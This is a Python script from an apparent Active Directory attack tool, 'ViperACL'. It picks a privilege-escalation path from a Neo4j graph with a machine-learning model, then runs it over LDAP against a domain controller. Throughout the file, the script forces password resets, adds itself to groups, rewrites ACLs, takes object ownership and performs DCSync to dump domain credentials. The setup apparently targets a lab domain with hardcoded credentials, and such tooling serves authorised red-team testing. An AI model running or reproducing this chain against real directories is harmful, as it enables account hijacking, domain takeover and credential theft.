import sys
import os
import joblib
import logging
from types import SimpleNamespace
# This forces Python to add your root ViperACL folder to its search path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.database import DatabaseManager
from core.pathfinder.pathfinder import PathfinderCoordinator
from core.pathfinder.rules import get_node_type, is_valid_path, normalize_path_dcsync
from core.privesc.modules.shared import PrivescActions
from core.privesc.state_context import SessionContext
from ldap3 import Server, Connection
from impacket.ldap import ldaptypes


logging.basicConfig(level=logging.INFO, format="%(message)s")

# CONFIGURATION
DC_IP = "192.168.101.10"
DOMAIN = "VIPERTECH.LOCAL"
SOURCE_USER = "VIPERTECH\\MIKE_INTERN"
SOURCE_PASS = "ViperLab2027!"
DEFAULT_RESET_PASSWORD = "ViperStrike2026!"

# Strictly allowed (relationship, target_type) action map.
STRICT_EDGE_ACTIONS = {
    ("MemberOf", "Group"): "noop",
    ("DCSync", "Domain"): "dcsync",
    ("AddMember", "Group"): "add_group_member",
    ("GenericWrite", "Group"): "add_group_member",
    ("GenericAll", "User"): "reset_password",
    ("GenericAll", "Group"): "add_group_member",
    ("GenericAll", "Domain"): "dcsync",
    ("AllExtendedRights", "User"): "reset_password",
    ("AllExtendedRights", "Domain"): "dcsync",
    ("WriteDacl", "User"): "grant_genericall_then_reset_password",
    ("WriteDacl", "Group"): "grant_addmember_then_add_group_member",
    ("WriteDacl", "Domain"): "grant_genericall_then_dcsync",
    ("Owns", "User"): "take_ownership_grant_genericall_then_reset_password",
    ("Owns", "Group"): "take_ownership_grant_addmember_then_add_group_member",
    ("Owns", "Domain"): "take_ownership_grant_genericall_then_dcsync",
    ("WriteOwner", "User"): "take_ownership_grant_genericall_then_reset_password",
    ("WriteOwner", "Group"): "take_ownership_grant_addmember_then_add_group_member",
    ("WriteOwner", "Domain"): "take_ownership_grant_genericall_then_dcsync",
    ("ForceChangePassword", "User"): "reset_password",
}


def _node_name(node):
    if isinstance(node, dict):
        return node.get("name") or node.get("distinguishedname") or "<unknown>"
    return str(node)


def _resolve_target_dn(actions, node):
    if isinstance(node, dict):
        dn = node.get("distinguishedname")
        if dn:
            return dn
        name = node.get("name")
        if name:
            candidates = [name]
            if "@" in name:
                candidates.append(name.split("@")[0])
            if "\\" in name:
                sam = name.split("\\")[-1]
                candidates.extend([sam, f"{sam}@{DOMAIN}"])

            for candidate in candidates:
                resolved = actions.resolve_distinguished_name(candidate)
                if resolved:
                    return resolved
    return None


def _resolve_current_user_dn(actions, context):
    current_auth = context.get_current_auth()
    username = current_auth.get("username")
    if not username:
        return None

    candidates = [username]
    if "\\" in username:
        sam = username.split("\\")[-1]
        candidates.extend([sam, f"{sam}@{DOMAIN}"])
    elif "@" in username:
        candidates.append(username.split("@")[0])

    for candidate in candidates:
        resolved = actions.resolve_distinguished_name(candidate)
        if resolved:
            return resolved

    return None


def _resolve_source_user_dn(actions, source_user):
    candidates = [source_user]
    if "\\" in source_user:
        sam = source_user.split("\\")[-1]
        candidates.extend([sam, f"{sam}@{DOMAIN}"])
    elif "@" in source_user:
        candidates.append(source_user.split("@")[0])

    for candidate in candidates:
        resolved = actions.resolve_distinguished_name(candidate)
        if resolved:
            return resolved

    return None


def build_strict_action_plan(path, db):
    if not is_valid_path(path, db):
        raise RuntimeError("Path contains disallowed edge/target pairs after strict validation")

    plan = []
    for i in range(0, len(path) - 2, 2):
        start_node = path[i]
        rel_type = path[i + 1]
        end_node = path[i + 2]
        target_type = get_node_type(end_node, db)
        action = STRICT_EDGE_ACTIONS.get((rel_type, target_type))
        if not action:
            raise RuntimeError(f"No strict action mapped for {rel_type} -> {target_type}")

        plan.append({
            "step": len(plan) + 1,
            "start_node": start_node,
            "end_node": end_node,
            "rel_type": rel_type,
            "target_type": target_type,
            "action": action,
        })

    return plan


def _grant_superset_access(actions, target_dn, current_sid, grant_label):
    logging.info(f"  [*] Granting {grant_label} (implemented as FullControl superset)")
    return _safe_call("grant_generic_all", actions.grant_generic_all, target_dn, current_sid)


def _grant_group_addmember(actions, group_dn, current_sid):
    logging.info("  [*] Granting AddMember on group via member-attribute write")
    return _safe_call("grant_group_addmember", actions.grant_group_addmember, group_dn, current_sid)


def _canonicalize_sid(raw_sid):
    if not raw_sid:
        return None
    if isinstance(raw_sid, str):
        return raw_sid
    if isinstance(raw_sid, (bytes, bytearray)):
        sid_obj = ldaptypes.LDAP_SID()
        sid_obj.fromString(raw_sid)
        return sid_obj.formatCanonical()
    return str(raw_sid)


def _safe_call(label, fn, *args):
    try:
        return fn(*args)
    except Exception as exc:
        logging.error(f"{label} raised exception: {exc}")
        return False


def _refresh_bind(actions, context):
    current_auth = context.get_current_auth()
    username = current_auth.get("username")
    password = current_auth.get("value")
    if not username or not password:
        return False
    if not actions.conn.rebind(user=username, password=password):
        logging.error("LDAP rebind failed while refreshing effective privileges")
        return False
    return True


def _switch_identity_after_reset(actions, context, end_node, target_dn):
    candidate_identities = []
    if isinstance(end_node, dict):
        if end_node.get("name"):
            candidate_identities.append(end_node.get("name"))
        if end_node.get("distinguishedname"):
            candidate_identities.append(end_node.get("distinguishedname"))
    if target_dn:
        candidate_identities.append(target_dn)

    for identity in candidate_identities:
        if not identity:
            continue
        if context.switch_identity(identity):
            if _refresh_bind(actions, context):
                logging.info(f"  [+] Pivoted execution identity to {identity}")
                return True

    logging.error("Failed to pivot context identity after password reset")
    return False


def execute_strict_action_plan(plan, actions, context):
    total = len(plan)
    logging.info(f"=== STRICT PRIVESC START: {total} steps ===")

    for item in plan:
        step = item["step"]
        rel_type = item["rel_type"]
        target_type = item["target_type"]
        action = item["action"]
        target_name = _node_name(item["end_node"])

        logging.info(f"[{step}/{total}] {rel_type} -> {target_name} ({target_type}) => {action}")

        current_auth = context.get_current_auth()
        current_password = current_auth.get("value")
        current_username = current_auth.get("username")
        current_sid = _canonicalize_sid(actions.get_object_sid(current_username))
        target_dn = _resolve_target_dn(actions, item["end_node"])

        if action == "noop":
            continue

        if action == "dcsync":
            if not current_password:
                logging.error("DCSYNC: no current password available")
                return False
            if not _safe_call("dcsync", actions.dcsync, current_password):
                return False
            continue

        if action == "add_group_member":
            current_user_dn = _resolve_current_user_dn(actions, context)
            if not target_dn or not current_user_dn:
                logging.error("ADD_GROUP_MEMBER: unable to resolve group DN or current user DN")
                return False
            if not _safe_call("add_group_member", actions.add_group_member, target_dn, current_user_dn):
                return False
            if not _refresh_bind(actions, context):
                return False
            continue

        if action == "reset_password":
            if not target_dn or not _safe_call("force_change_password", actions.force_change_password, target_dn, DEFAULT_RESET_PASSWORD):
                return False
            bind_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name
            context.add_credential(bind_identity, "password", DEFAULT_RESET_PASSWORD)
            if not _switch_identity_after_reset(actions, context, item["end_node"], target_dn):
                return False
            continue

        if action == "grant_addmember_then_add_group_member":
            if not target_dn or not current_sid:
                logging.error("WRITE_DACL/OWNS/WRITE_OWNER GROUP: unable to resolve target DN or current SID")
                return False
            if not _grant_group_addmember(actions, target_dn, current_sid):
                return False
            if not _refresh_bind(actions, context):
                return False
            current_user_dn = _resolve_current_user_dn(actions, context)
            if not current_user_dn:
                logging.error("WRITE_DACL/OWNS/WRITE_OWNER GROUP: unable to resolve current user DN")
                return False
            if not _safe_call("add_group_member", actions.add_group_member, target_dn, current_user_dn):
                return False
            if not _refresh_bind(actions, context):
                return False
            continue

        if action == "grant_genericall_then_reset_password":
            if not target_dn or not current_sid:
                logging.error("WRITE_DACL/OWNS/WRITE_OWNER USER: unable to resolve target DN or current SID")
                return False
            if not _grant_superset_access(actions, target_dn, current_sid, "GenericAll"):
                return False
            if not _refresh_bind(actions, context):
                return False
            if not _safe_call("force_change_password", actions.force_change_password, target_dn, DEFAULT_RESET_PASSWORD):
                return False
            bind_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name
            context.add_credential(bind_identity, "password", DEFAULT_RESET_PASSWORD)
            if not _switch_identity_after_reset(actions, context, item["end_node"], target_dn):
                return False
            continue

        if action == "grant_genericall_then_dcsync":
            if not target_dn or not current_sid:
                logging.error("WRITE_DACL/OWNS/WRITE_OWNER DOMAIN: unable to resolve target DN or current SID")
                return False
            if not _grant_superset_access(actions, target_dn, current_sid, "GenericAll"):
                return False
            if not _refresh_bind(actions, context):
                return False
            if not current_password or not _safe_call("dcsync", actions.dcsync, current_password):
                return False
            continue

        if action == "take_ownership_grant_addmember_then_add_group_member":
            if not target_dn:
                logging.error("GROUP OWNERSHIP CHAIN: unable to resolve target DN")
                return False

            grant_actor = context.current_identity or SOURCE_USER
            grant_actor_dn = _resolve_source_user_dn(actions, grant_actor)
            grant_actor_sid = _canonicalize_sid(actions.get_object_sid(grant_actor))
            target_member = "MIKE_INTERN@VIPERTECH.LOCAL"
            target_member_dn = _resolve_source_user_dn(actions, target_member)
            if not grant_actor_dn or not grant_actor_sid or not target_member_dn:
                logging.error("GROUP OWNERSHIP CHAIN: unable to resolve the operator or member identity")
                return False

            owner_sid = actions.get_owner_sid(target_dn)
            if owner_sid and owner_sid == grant_actor_sid and actions.is_member_of_group(target_dn, target_member_dn):
                if context.switch_identity(target_member) and _refresh_bind(actions, context):
                    logging.info(f"  [+] Reused satisfied ownership state and pivoted execution identity to {target_member}")
                logging.info(f"  [+] {target_member} already has AddMember rights and is already in {target_name}; no additional change required.")
                continue

            if owner_sid != grant_actor_sid:
                if not _safe_call("set_owner", actions.set_owner, target_dn, grant_actor_sid):
                    return False
                if not _refresh_bind(actions, context):
                    return False

            if not _grant_group_addmember(actions, target_dn, grant_actor_sid):
                return False
            if not _refresh_bind(actions, context):
                return False

            if not context.switch_identity(target_member):
                logging.error("GROUP OWNERSHIP CHAIN: could not switch to MIKE_INTERN after grant")
                return False
            if not _refresh_bind(actions, context):
                return False

            if not _safe_call("add_group_member", actions.add_group_member, target_dn, target_member_dn):
                return False
            continue

        if action == "take_ownership_grant_genericall_then_reset_password":
            if not target_dn or not current_sid:
                logging.error("USER OWNERSHIP CHAIN: unable to resolve target DN or current SID")
                return False
            if not _safe_call("set_owner", actions.set_owner, target_dn, current_sid):
                return False
            if not _refresh_bind(actions, context):
                return False
            if not _grant_superset_access(actions, target_dn, current_sid, "GenericAll"):
                return False
            if not _refresh_bind(actions, context):
                return False
            if not _safe_call("force_change_password", actions.force_change_password, target_dn, DEFAULT_RESET_PASSWORD):
                return False
            bind_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name
            context.add_credential(bind_identity, "password", DEFAULT_RESET_PASSWORD)
            if not _switch_identity_after_reset(actions, context, item["end_node"], target_dn):
                return False
            continue

        if action == "take_ownership_grant_genericall_then_dcsync":
            if not target_dn or not current_sid:
                logging.error("DOMAIN OWNERSHIP CHAIN: unable to resolve target DN or current SID")
                return False
            if not _grant_superset_access(actions, target_dn, current_sid, "GenericAll"):
                return False
            if not _refresh_bind(actions, context):
                return False
            if not current_password or not _safe_call("dcsync", actions.dcsync, current_password):
                return False
            continue

        logging.error(f"Unhandled strict action: {action}")
        return False

    logging.info("=== STRICT PRIVESC COMPLETE ===")
    return True

# 1. Find the Path (Neo4j)
db = DatabaseManager()
db.connect()
pf = PathfinderCoordinator(db)

model_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "models", "viper_rf_model.pkl")
rf_model = joblib.load(model_path)

ranked_paths = pf.find_path(
    "MIKE_INTERN@VIPERTECH.LOCAL",
    "VIPERTECH.LOCAL",
    mode="predictive",
    ml_model=rf_model,
    ml_threshold=0.00,
)

if not ranked_paths or len(ranked_paths) < 1:
    raise RuntimeError("Predictive mode did not return a path")

rank2_path = ranked_paths[0]["path"]
rank2_score = ranked_paths[0]["success_probability"]
rank2_path = normalize_path_dcsync(rank2_path, db)

logging.info("[*] Selected predictive path")
logging.info(f"[*] Success Probability: {rank2_score}%")

for i in range(0, len(rank2_path) - 2, 2):
    start_node = rank2_path[i]["name"]
    rel_type = rank2_path[i + 1]
    end_node = rank2_path[i + 2]["name"]
    logging.info(f"  {start_node} --[{rel_type}]--> {end_node}")

strict_plan = build_strict_action_plan(rank2_path, db)
logging.info("[*] Strict edge+target action plan")
for item in strict_plan:
    logging.info(
        f"  Step {item['step']}: {item['rel_type']} -> {_node_name(item['end_node'])} "
        f"({item['target_type']}) => {item['action']}"
    )

server = Server(DC_IP, use_ssl=True, get_info=None)
conn = Connection(server, user=SOURCE_USER, password=SOURCE_PASS, auto_bind=True)

# 2. Initialize the new privesc engine context
context = SessionContext(
    domain=DOMAIN,
    dc_ip=DC_IP,
    initial_user=SOURCE_USER,
    initial_password=SOURCE_PASS,
)
actions_engine = SimpleNamespace(conn=conn, domain=DOMAIN, dc_ip=DC_IP)
actions = PrivescActions(actions_engine)

# 3. Execute strict per-step actions from the edge+target matrix
if not execute_strict_action_plan(strict_plan, actions, context):
    raise RuntimeError("Strict full-chain execution failed")
